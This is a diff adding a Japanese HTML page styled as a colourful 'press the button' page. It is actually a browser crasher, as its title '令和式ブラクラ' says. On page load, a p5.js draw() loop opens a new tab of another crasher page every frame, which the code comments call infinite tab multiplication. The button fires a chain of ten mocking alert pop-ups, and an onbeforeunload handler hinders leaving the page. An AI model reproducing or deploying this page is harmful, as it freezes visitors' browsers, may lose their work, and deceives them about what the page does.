@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="shortcut icon" href="https://raw.githubusercontent.com/Castoroides/uky/main/favicon.ico">
+  <title>令和式ブラクラ（仮）</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  
+  
+</head>
+
+<body>
+  <marquee behavior="alternate"><font face="HGP創英角ﾎﾟｯﾌﾟ体" size="7"><b><font color="#ff0000">令</font><font color="#ff5500">和</font><font color="#ffaa00">式</font><font color="#ffff00">ブ</font><font color="#aaff00">ラ</font><font color="#55ff00">ク</font><font color="#00ff00">ラ</font><font color="#00ff55">（</font><font color="#00ffaa">仮</font><font color="#00ffff">）</font></b></font></marquee>
+  <div class="gradient"></div>
+  <div>
+    <p class=txt>ボタンを押してね！</p>
+    <button type="button" class="s_b" onclick="buttonClick()">クリック！</button>
+  </div>
+</body>
+
+<style>
+@charset "Shift_JIS";
+body {
+  background: linear-gradient(25deg,#fcc5e4 0%,
+    #ff0000 15%,
+    #ffc000 35%,
+    #ffff00 52%,
+    #00ff00 71%,
+    #0000ff 87%,
+    #ff00ff 100%) fixed;
+}
+
+div {
+  margin: 120px 0;
+  text-align: center;
+}
+.txt {
+  font-family: Meiryo, "Hiragino Kaku Gothic Pro W3", Courier New, sans-serif;
+  line-height: 1.5;
+  margin-bottom: 25px;
+  color: #0000ff;
+  font-size: 2.5rem;
+}
+.s_b {
+  width: 30vw;
+  height: 20vh;
+  color: #000;
+  font-size: 1.5rem;
+  font-family:"HGP創英角ﾎﾟｯﾌﾟ体";
+}
+.s_b:hover {
+  background: linear-gradient(#fcc5e4 0%,
+    #ff0000 15%,
+    #0000ff 87%,
+    #ff00ff 100%) fixed;
+    color: #fff;
+}
+</style>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.1.9/p5.min.js"></script>
+<script>
+
+let f_cnt;
+f_cnt = 0;
+const url = 'https://castoroides.github.io/burakura/2_burakura_kari.html'
+
+// ページが読みこまれた際に実行される、1フレーム（1/60秒）ごとに実行される関数
+function draw() {
+	//無限タブ増殖
+	window.open(url, '_blank')
+}
+function buttonClick(){
+  
+  for(i=10; i>0; i--){
+    alert("あと" + i + "回押してね（笑）");
+  }
+}
+// Close字のダイアログ(Chromeは文字いじれない)
+window.onbeforeunload = function(e) {
+    e.returnValue = "また来てね＾＾";
+}
+</script>
+
+
+</html>
